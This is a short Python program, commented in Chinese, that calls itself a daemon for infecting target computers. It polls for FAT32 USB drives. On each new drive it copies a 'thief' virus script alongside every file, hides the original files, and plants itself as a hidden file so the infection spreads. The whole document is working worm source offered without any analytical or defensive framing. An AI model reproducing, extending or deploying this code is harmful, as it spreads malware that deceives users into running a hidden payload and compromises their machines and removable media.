### DAEMON 守护进程/服务,用于感染目标电脑 ###
### 此程序不可在osX或GNU/Linux上启动 ###
import os
import psutil
import time
import win32con
import win32api
import shutil
import subprocess
from tkinter import messagebox

DAEMON_PATH="D:\\vscode\\SYSTEM\\daemon.py"
THIEF_PATH="D:\\vscode\\SYSTEM\\thief.txt.py"
DAEMON_NAME="daemon.py"
THIEF_NAME="thief.txt.py"



def get_sum(file_system_type): #返回磁盘的个数(其中只包括file_system_type这个文件系统的磁盘)
    s=0
    disks=psutil.disk_partitions()
    for d in disks:
        if d.fstype==file_system_type: s=s+1
    return s


class usb:
    def __init__(self, drive1):
        self.drive=drive1 #此变量用于记录u盘的盘符

    def attack(self):
        target_files=os.listdir(self.drive)
        target_files.remove("System Volume Information")
        for f in target_files:
            if not("." in f): target_files.remove(f) #排除目标中的文件夹,因为复制对文件夹无效
        
        for f in target_files:
            target=self.drive+f
            #拷贝病毒
            shutil.copyfile(THIEF_PATH, target+".py") 
            #隐藏u盘中的文件
            win32api.SetFileAttributes(target, win32con.FILE_ATTRIBUTE_HIDDEN) 
        #拷贝demon守卫进程并隐藏
        shutil.copyfile(DAEMON_PATH, self.drive+DAEMON_NAME)
        win32api.SetFileAttributes(self.drive+DAEMON_NAME, win32con.FILE_ATTRIBUTE_HIDDEN) 


while True:
    time.sleep(3)
    usb_sum=get_sum("FAT32")
    if usb_sum>0:
        disks=psutil.disk_partitions()
        for d in disks:
            dev=d.device
            if d.fstype=="FAT32" and not(os.path.exists(dev+DAEMON_NAME)):
                usb1=usb(dev)
                print(dev)
                usb1.attack()